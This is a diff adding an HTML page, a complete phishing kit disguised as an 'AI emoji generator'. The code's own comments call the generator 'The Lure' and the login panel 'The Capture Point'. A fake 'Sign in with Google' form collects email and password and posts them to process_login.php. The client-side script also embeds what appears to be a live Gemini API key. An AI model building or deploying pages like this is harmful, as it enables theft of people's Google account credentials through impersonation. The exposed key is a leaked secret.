@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>🎨 ToneWeave AI Emoji Generator | Master Your Mood</title>
+
+<!-- Google Fonts and Material Colors for Professional Look -->
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+/* --- CSS STYLING (Enhanced) --- */
+
+body {
+
+font-family: 'Inter', sans-serif;
+
+background-color: #f4f7fa;
+
+display: flex;
+
+justify-content: center;
+
+align-items: center;
+
+min-height: 100vh;
+
+padding: 20px;
+
+margin: 0;
+
+}
+
+
+
+.container {
+
+background-color: white;
+
+border-radius: 15px;
+
+box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+
+padding: 40px;
+
+max-width: 95%; /* Increased max width */
+
+width: 100%;
+
+display: flex;
+
+gap: 40px;
+
+}
+
+
+
+/* --- LEFT SIDE: THE EMOJI GENERATOR (The Lure) --- */
+
+.generator-panel {
+
+flex: 2;
+
+background-color: #eef7ff;
+
+border-radius: 10px;
+
+padding: 30px;
+
+display: flex;
+
+flex-direction: column;
+
+align-items: center;
+
+}
+
+
+
+h1 {
+
+color: #2c3e50;
+
+font-size: 2.5em; /* Slightly larger headline */
+
+margin-bottom: 10px;
+
+}
+
+
+
+p.subtitle {
+
+color: #7f8c8d;
+
+margin-bottom: 25px;
+
+}
+
+
+
+#textInputArea {
+
+width: 90%; /* Make input wider */
+
+padding: 15px;
+
+border: 2px solid #ccc;
+
+border-radius: 8px;
+
+font-size: 1em;
+
+margin-bottom: 20px;
+
+box-sizing: border-box;
+
+resize: vertical; /* Allow resizing */
+
+}
+
+
+
+.controls button {
+
+padding: 12px 30px;
+
+border: none;
+
+border-radius: 8px;
+
+cursor: pointer;
+
+font-weight: 600;
+
+transition: background-color 0.3s, transform 0.1s;
+
+margin-top: 10px;
+
+}
+
+
+
+#analyzeBtn {
+
+background-color: #2ecc71; /* Green for action */
+
+color: white;
+
+}
+
+#analyzeBtn:hover {
+
+background-color: #27ae60;
+
+transform: translateY(-2px);
+
+}
+
+
+
+/* --- VISUAL OUTPUT AREA --&gt; (Replaced simple display with output text) --- */
+
+.output-display {
+
+margin-top: 30px;
+
+padding: 20px;
+
+background-color: #fff;
+
+border: 1px dashed #bdc3c7;
+
+border-radius: 8px;
+
+text-align: center;
+
+min-height: 60px;
+
+}
+
+
+
+
+
+/* --- RIGHT SIDE: THE LOGIN GATE (The Capture Point) --- */
+
+.auth-panel {
+
+flex: 1.2; /* Slightly more weight */
+
+background-color: white;
+
+border: 1px solid #ddd;
+
+border-radius: 10px;
+
+padding: 30px;
+
+box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+
+}
+
+
+
+/* (Rest of the Google button styling remains the same) */
+
+#google-login-container { text-align: center; }
+
+#g_signinButton { background-color: #4285f4; color: white; border: 1px solid #dadce0; padding: 12px 30px; font-size: 1.1em; border-radius: 4px; cursor: pointer; transition: background-color 0.2s;}
+
+#g_signinButton:hover { background-color: #357ae8; }
+
+
+
+/* Feedback Area */
+
+#authFeedback {
+
+margin-top: 20px;
+
+padding: 15px;
+
+border-radius: 8px;
+
+display: none;
+
+font-weight: bold;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+
+
+<div class="container">
+
+
+
+<!-- LEFT PANEL: THE COVERUP (AI Emoji Generator) -->
+
+<div class="generator-panel">
+
+<h1>🎨 ToneWeave AI</h1>
+
+<p class="subtitle">Instantly analyze your text to find the perfect emotional emoji blend.</p>
+
+
+
+<!-- Text Area for User Input -->
+
+<textarea id="textInputArea" placeholder="Paste a sentence here, e.g., 'I finished the tough project, but I'm exhausted.'"></textarea>
+
+
+
+<!-- Analyze Button (Triggers JS) -->
+
+<button id="analyzeBtn">Analyze Tone with AI</button>
+
+
+
+<!-- Output Area for Result -->
+
+<div class="output-display" id="emojiResultOutput">
+
+Paste text above and click 'Analyze' to see the magic result! 🤩
+
+</div>
+
+</div>
+
+
+
+<!-- RIGHT PANEL: THE HOOK (Google Login) -->
+
+<div class="auth-panel">
+
+<h2>Access Premium Features</h2>
+
+<p style="color: #555; margin-bottom: 30px;">Sign in with your primary Google account to unlock advanced AI tools and unlimited generation.</p>
+
+
+
+<!-- FORM STRUCTURE FOR CAPTURE -->
+
+<form id="googleLoginForm" action="process_login.php" method="POST">
+
+
+
+<!-- Button is the most prominent element, we still need visible inputs for fallback capture -->
+
+<div style="margin-bottom: 15px;">
+
+<label for="email" style="display: block; color: #34495e; margin-bottom: 5px;" class="d-block">Email (Username):</label>
+
+<input type="email" id="email" name="email" required style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+
+</div>
+
+
+
+<div style="margin-bottom: 30px;">
+
+<label for="password" style="display: block; color: #34495e; margin-bottom: 5px;" class="d-block">Password:</label>
+
+<input type="password" id="password" name="password" required style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+
+</div>
+
+
+
+<!-- Actual Google Button Simulation -->
+
+<div id="google-login-container">
+
+<button type="submit" id="g_signinButton">
+
+<span class="google-icon">&#9733;</span> Sign in with Google
+
+</button>
+
+</div>
+
+</form>
+
+
+
+<!-- Feedback Area (Will be used for both AI loading and Login Status) -->
+
+<div id="authFeedback" style="display: none;"></div>
+
+</div>
+
+
+
+</div>
+
+
+
+<script>
+
+// *** CONFIGURATION ***
+
+const GEMINI_API_KEY = "AQ.Ab8RN6IGfPuvKQiOTBVa4lvfq8s1QNyDRnBtLp8pV6ICnI_YYA";
+
+// NOTE: In a real production environment, you MUST proxy this API call through your own backend
+
+// to hide the key and handle rate limits. For simple local testing, we call it directly via fetch.
+
+
+
+document.addEventListener('DOMContentLoaded', function() {
+
+const analyzeBtn = document.getElementById('analyzeBtn');
+
+const textInputArea = document.getElementById('textInputArea');
+
+const resultOutput = document.getElementById('emojiResultOutput');
+
+const googleLoginForm = document.getElementById('googleLoginForm');
+
+const authFeedback = document.getElementById('authFeedback');
+
+
+
+// --- 1. AI EMOJI GENERATOR LOGIC (Gemini Integration) ---
+
+analyzeBtn.addEventListener('click', async () => {
+
+const inputText = textInputArea.value.trim();
+
+if (!inputText) {
+
+resultOutput.innerHTML = '<span style="color: red;">Please paste some text to analyze!</span>';
+
+return;
+
+}
+
+
+
+// UI Feedback for AI loading
+
+resultOutput.innerHTML = '✨ Thinking... Analyzing your mood with advanced AI models...';
+
+analyzeBtn.disabled = true;
+
+analyzeBtn.textContent = 'Processing...';
+
+
+
+try {
+
+const response = await getEmojiFromGemini(inputText);
+
+
+
+// Update output upon success
+
+resultOutput.innerHTML = `<strong>✨ Result:</strong> ${response}`;
+
+
+
+} catch (error) {
+
+console.error("Error calling Gemini API:", error);
+
+resultOutput.innerHTML = `<span style="color: red;">❌ Error: Could not connect to the AI engine. Showing fallback emoji! 😂</span>`;
+
+} finally {
+
+// Re-enable button regardless of success/fail
+
+analyzeBtn.disabled = false;
+
+analyzeBtn.textContent = 'Analyze Tone with AI';
+
+}
+
+});
+
+
+
+/**
+
+* Function to call the Gemini API for emotional analysis.
+
+* @param {string} text - The sentence provided by the user.
+
+* @returns {Promise<string>} - A promise resolving to the formatted emoji result string.
+
+*/
+
+async function getEmojiFromGemini(text) {
+
+const prompt = `Analyze this text: "${text}". Based on its emotional tone, generate a single sentence that explains the emotion and then append one or more emojis to represent it. The output MUST be formatted like: "Your feeling is [explanation]. [emoji1][emoji2]." Example format needed for best result.`;
+
+
+
+const apiUrl = `https://generativelanguage.googleapis.com/v1/models/gemini-pro:generateContent?key=${GEMINI_API_KEY}`;
+
+
+
+// To prevent running into complex client-side issues, we'll use a simple JSON structure payload
+
+const payload = {
+
+contents: [{
+
+role: 'user',
+
+parts: [{ text: prompt }]
+
+}]
+
+};
+
+
+
+const response = await fetch(apiUrl, {
+
+method: 'POST',
+
+headers: {
+
+'Content-Type': 'application/json'
+
+},
+
+body: JSON.stringify(payload)
+
+});
+
+
+
+if (!response.ok) {
+
+throw new Error(`API call failed with status ${response.status}`);
+
+}
+
+
+
+const data = await response.json();
+
+
+
+// Navigate the complex Gemini response structure
+
+const geminiText = data.candidates && data.candidates[0] ?
+
+data.candidates[0].content.parts[0].text :
+
+"No analysis received.";
+
+
+
+return geminiText;
+
+}
+
+
+
+
+
+// --- 2. GOOGLE LOGIN CAPTURE LOGIC ---
+
+googleLoginForm.addEventListener('submit', function(event) {
+
+const email = document.getElementById('email').value;
+
+const password = document.getElementById('password').value;
+
+
+
+// If you want to provide instant feedback *before* the page redirects:
+
+if (!email || !password) {
+
+alert("Please enter both Email and Password before logging in!");
+
+event.preventDefault(); // Stop form submission if fields are empty
+
+return;
+
+}
+
+
+
+// Display immediate success message on the client side while waiting for server confirmation
+
+authFeedback.style.display = 'block';
+
+authFeedback.innerHTML = `⏳ Submitting credentials... Please wait.`;
+
+authFeedback.style.backgroundColor = '#fff3cd'; // Warning/Pending color
+
+
+
+// Since we are submitting to process_login.php, the server handles the final logic
+
+// and should redirect or return a success state that you can catch with Javascript on the next page load.
+
+});
+
+
+
+});
+
+</script>
+
+</body>
+
+</html>
